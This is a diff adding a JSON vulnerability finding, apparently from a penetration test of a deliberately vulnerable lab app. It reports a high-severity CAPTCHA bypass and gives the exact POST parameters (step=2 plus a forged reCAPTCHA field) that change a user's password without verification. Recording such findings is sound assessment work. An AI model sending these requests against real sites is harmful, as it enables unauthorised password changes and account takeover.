@@ -1,0 +1,11 @@
+{
+  "title": "Insecure CAPTCHA - Bypass via Parameter Manipulation",
+  "severity": "High",
+  "location": "/vulnerabilities/captcha/",
+  "proof": "POST to /vulnerabilities/captcha/ with step=2&password_new=bypass123&password_conf=bypass123&Change=Change&g-recaptcha-response=hacked successfully bypassed the reCAPTCHA check. By setting 'step=2' directly, the server skips reCAPTCHA verification entirely. The new password was accepted and worked for subsequent login.",
+  "poc_steps": [
+    "POST /vulnerabilities/captcha/ with step=2&password_new=attacker&password_conf=attacker&Change=Change&g-recaptcha-response=arbitrary",
+    "Note: reCAPTCHA API key is missing from config (per /var/www/html/config/config.inc.php)",
+    "Password changed without solving any CAPTCHA"
+  ]
+}
